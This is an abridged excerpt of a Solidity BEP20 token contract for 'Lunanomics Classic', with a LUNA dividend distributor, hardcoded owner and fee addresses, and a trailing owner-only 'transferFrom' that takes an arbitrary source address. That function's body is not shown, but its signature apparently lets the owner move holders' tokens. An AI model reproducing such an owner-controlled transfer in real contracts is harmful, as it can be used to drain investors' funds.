...
/**
Telegram :https://t.me/LunanomicsClassic
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 LUNA = IBEP20(0x156ab3346823B651294766e23e6Cf87254d68962);
    ...
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = LUNA.balanceOf(address(this));
        ...
        uint256 amount = LUNA.balanceOf(address(this)).sub(balanceBefore);
    ...
    function distributeDividend(address shareholder) internal {
        ...
        if(amount > 0){
            ...
            LUNA.transfer(shareholder, amount);
...
contract LunaNomics is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Lunanomics Classic";
    string constant _symbol = "LUNANOMICS";
    ...
    address public Owner=0x11D5b3FaFfC51F5b0C42E582d4F6a2896b08e1D8; // owner address
    ...
    constructor () Auth(Owner) {
        ...
        marketingFeeReceiver =0xCFE17536aD36252b6F265CeC66AB09cCE5A1E068;
...
/*  Begins */
 ...
 function transferFrom(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
